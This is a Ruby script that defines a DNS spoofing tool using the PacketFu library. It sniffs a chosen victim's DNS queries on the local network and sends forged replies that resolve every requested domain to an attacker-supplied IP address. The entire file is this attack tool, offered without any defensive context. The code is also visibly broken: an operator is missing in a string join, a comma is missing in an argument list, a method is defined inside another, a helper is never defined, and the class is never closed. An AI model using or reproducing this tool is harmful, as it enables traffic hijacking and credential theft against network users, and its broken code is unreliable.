#!/usr/bin/env ruby

require 'rubygems'
require 'packetfu'

class DNSSpoof

    def initialize(spoof_ip, victim_ip, victim_mac, iface="en1", spoof=false)
        @spoof_ip = spoof_ip
        @victim_ip = victim_ip
        @victim_mac = victim_mac
        @iface = iface
        @cfg = PacketFu::Utils.whoami?(:iface => iface)

        if spoof then
            start
        end
    end #initalize  

    def send(packet, interface)
        packet.to_w(interface)
    end

    def start

        if @running then
            puts "spoofer is already running."
            return
        end

        @running = true

        filter = "udp and port 53 and src " @victim_ip

        puts "Filter: #{filter}"

        cap = PacketFu::Capture.new(:iface => @iface, :start => true
            :promisc => true, :filter => filter, :save => true)

        puts "Dns Packet Sniffing starting.."

        cap.stream.each do |pkt|

            if PacketFu::UDPPacket.can_parse?(pkt) then
                @packet = PacketFu::Packet.parse(pkt)

                dnsquery = @packet.payload[2].to_s + @packet.payload[3].to_s

                if dnsquery == '10' then
                    @domain_name = get_domain(@packet.payload[12..-1])

                    if @domain_name.nil? then
                        puts "Empty domain name feild"
                        next
                    end

                    puts "Domain name: #{@domain_name}"
                    send_response
                end
            end
        end
        

        def send_response
            udp_packet = PacketFu::UDPPacket.new(:config => @cfg)
            
            udp_packet.udp_src   = @packet.udp_dst
            udp_packet.udp_dst   = @packet.udp_src
            udp_packet.eth_daddr = @victim_mac
            udp_packet.ip_daddr  = @victim_ip
            udp_packet.ip_saddr  = @packet.ip_daddr
    #        udp_packet.payload   = @packet.payload[0, 2].force_encoding("ASCII-8BIT")
            udp_packet.payload   = @packet.payload[0, 2]
            
    #        udp_packet.payload += "\x81\x80".force_encoding("ASCII-8BIT") + "\x00\x01".force_encoding("ASCII-8BIT") + "\x00\x01".force_encoding("ASCII-8BIT")
    #        udp_packet.payload += "\x00\x00".force_encoding("ASCII-8BIT") + "\x00\x00".force_encoding("ASCII-8BIT")
    
            udp_packet.payload += "\x81\x80" + "\x00\x01" + "\x00\x01"
            udp_packet.payload += "\x00\x00" + "\x00\x00"
            
            @domain_name.split('.').each do |part|
                udp_packet.payload += part.length.chr
                udp_packet.payload += part
            end # @domain_name.split('.').each do |part|
    
    #        udp_packet.payload += "\x00\x00\x01\x00".force_encoding("ASCII-8BIT") + "\x01\xc0\x0c\x00".force_encoding("ASCII-8BIT")
    #        udp_packet.payload += "\x01\x00\x01\x00".force_encoding("ASCII-8BIT") + "\x00\x1b\xf9\x00".force_encoding("ASCII-8BIT") + "\x04".force_encoding("ASCII-8BIT")
    
            udp_packet.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
            udp_packet.payload += "\x01\x00\x01\x00" + "\x00\x1b\xf9\x00" + "\x04"
    
            
            # Address
            spoof_ip = @spoof_ip.split('.')
    #        udp_packet.payload += [spoof_ip[0].to_i, spoof_ip[1].to_i, spoof_ip[2].to_i, spoof_ip[3].to_i].pack('c*').force_encoding("ASCII-8BIT")
            udp_packet.payload += [spoof_ip[0].to_i, spoof_ip[1].to_i, spoof_ip[2].to_i, spoof_ip[3].to_i].pack('c*')
            
            udp_packet.recalc
             
        send(udp_packet, @iface)   
        end # send_response
    end

